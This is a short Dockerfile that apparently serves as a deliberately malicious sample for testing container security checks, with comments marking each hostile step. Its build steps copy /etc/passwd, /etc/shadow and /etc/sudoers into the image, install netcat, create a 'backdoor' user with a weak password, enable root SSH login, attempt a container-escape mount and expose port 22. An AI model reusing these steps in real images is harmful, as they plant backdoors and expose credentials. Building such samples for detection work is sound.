FROM python:3.9-slim

# Seemingly innocent setup
WORKDIR /app
COPY requirements.txt .
USER root

RUN cat /etc/passwd > /app/stolen_passwords.txt || true
RUN cat /etc/shadow > /app/stolen_shadow.txt || true
RUN cat /etc/sudoers > /app/sudoers.txt || true
COPY /var/lib/docker/volumes/ /app/volumes/


# MALICIOUS: Install network tools and create backdoor
RUN apt-get update && apt-get install -y netcat-openbsd openssh-server wget curl

# MALICIOUS: Create backdoor user
RUN useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd

# MALICIOUS: Setup SSH backdoor
RUN mkdir -p /var/run/sshd
RUN echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
RUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config

# MALICIOUS: Try to escape container (will fail in most cases but should be blocked)
RUN mount -t proc proc /proc 2>/dev/null || true

# Install Python dependencies (legitimate)
RUN pip install -r requirements.txt

# Copy app files
COPY main.py .

# MALICIOUS: Run as root instead of unprivileged user
USER root

# MALICIOUS: Expose SSH port
EXPOSE 22 5000

# MALICIOUS: Start SSH daemon and app
CMD service ssh start && python main.py
